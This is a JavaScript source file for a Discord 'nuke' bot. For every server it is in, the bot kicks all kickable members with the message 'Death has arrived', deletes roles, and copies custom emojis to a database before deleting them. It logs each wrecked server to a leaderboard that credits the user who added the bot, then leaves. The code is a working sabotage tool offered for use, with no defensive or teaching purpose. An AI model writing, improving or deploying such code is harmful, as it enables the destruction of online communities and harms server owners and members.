import { Permissions } from "discord.js";
import Prisma from "@prisma/client";
import fs from "fs";

const { PrismaClient } = Prisma;
const prisma = new PrismaClient();
const LOG_PATH = process.env.LOG_PATH || "./logs";
const KICK_MSG = process.env.KICK_MSG || "Death has arrived";
const BOT_ID = process.env.BOT_ID || "936295987499122788";

let emojiCounter = 0;
let textChannelCounter = 0;
let voiceChannelCounter = 0;
let killCounter = 0;
let serverId = 0;

const StealEmoji = async (g) => {
  let emojis = [];

  await g.emojis.fetch().then((emo) =>
    emo.map((e) => {
      emojiCounter++;
      emojis.push({
        name: e.name,
        url: e.url,
      });
    })
  );

  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_EMOJIS_AND_STICKERS)) {
    await g.emojis.cache.map((e) => {
      e.deletable && e.delete();
    });
  }

  return emojis.map((e) =>
    prisma.emojis.create({
      data: {
        name: e.name,
        url: e.url,
        serverId: serverId,
      },
    })
  );
};

const PurgeChannels = async (g) => {
  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_CHANNELS)) {
    await g.channels.fetch().then((channels) =>
      channels.map((ch) => {
        ch.isText() ? textChannelCounter++ : voiceChannelCounter++;
      })
    );
  }
};

const PurgeMembers = async (g) => {
  if (g.me.hasPermission(Permissions.FLAGS.KICK_MEMBERS)) {
    await g.members
      .fetch()
      .then((members) =>
        members.map((m) => m.kickable && m.kick(KICK_MSG) && killCounter++)
      );
  }
};

const PurgeRoles = async (g) => {
  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_ROLES)) {
    await g.roles.fetch().then((roles) =>
      roles.map((role) => {
        role.editable && role.delete();
      })
    );
  }
};

const Logging = (g) => {
  let log = `[${new Date().toISOString()}] [INFO] Death has arrived to: ${
    g.name
  } Deaths: ${killCounter}, Text Channels: ${textChannelCounter},  Voice Channels: ${voiceChannelCounter}, Total: ${
    textChannelCounter + voiceChannelCounter
  } \n`;

  fs.appendFile(`${LOG_PATH}/log.txt`, log, (err) => {
    if (err) throw err;
  });

  console.log(log);
};

const UpdateStats = () => {
  return prisma.deathStats.upsert({
    where: {
      id: 1,
    },
    update: {
      servers: { increment: 1 },
      kills: { increment: killCounter },
      textChannels: { increment: textChannelCounter },
      voiceChannels: { increment: voiceChannelCounter },
    },
    create: {
      id: 1,
      servers: 0,
      kills: 0,
      textChannels: 0,
      voiceChannels: 0,
    },
  });
};

const UpdateUserRanking = async (client, g) => {
  let server;

  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_GUILD)) {
    let intergations = await g.fetchIntegrations();
    for (const [key, int] of intergations.entries()) {
      if (int.application.id == BOT_ID) {
        let serchedUser = client.users.cache.find(
          (user) => user.id === int.user.id
        );

        let deathbringer = await prisma.deathbringer.upsert({
          where: {
            userId: int.user.id,
          },
          update: {
            killedServersCount: { increment: 1 },
            removedTextChannels: { increment: textChannelCounter },
            removedVoiceChannels: { increment: voiceChannelCounter },
          },
          create: {
            username: serchedUser.username,
            userId: serchedUser.id,
            killedServersCount: 1,
            removedTextChannels: textChannelCounter,
            removedVoiceChannels: voiceChannelCounter,
          },
        });

        server = await prisma.purgedServer.create({
          data: {
            name: g.name,
            ownerId: g.ownerId,
            memberCount: g.memberCount,
            memberRemoved: killCounter,
            premiumTier: g.premiumTier,
            emojiCount: emojiCounter,
            killerId: deathbringer.id,
          },
        });
      }
    }
  } else {
    server = await prisma.purgedServer.create({
      data: {
        name: g.name,
        ownerId: g.ownerId,
        memberCount: g.memberCount,
        memberRemoved: killCounter,
        premiumTier: g.premiumTier,
        emojiCount: emojiCounter,
        killerId: 0,
      },
    });
  }
  return server.id;
};

export const Purge = (client) => {
  client.guilds.cache.map(async (g) => {
    emojiCounter = 0;
    textChannelCounter = 0;
    voiceChannelCounter = 0;
    killCounter = 0;
    serverId = 0;

    await PurgeChannels(g);
    await PurgeMembers(g);
    await PurgeRoles(g);
    serverId = await UpdateUserRanking(client, g);

    let emojiBatchInsert = await StealEmoji(g);
    let statUpdate = UpdateStats(g);

    await prisma.$transaction([...emojiBatchInsert, statUpdate]);

    Logging(g);

    g.leave();
  });
};
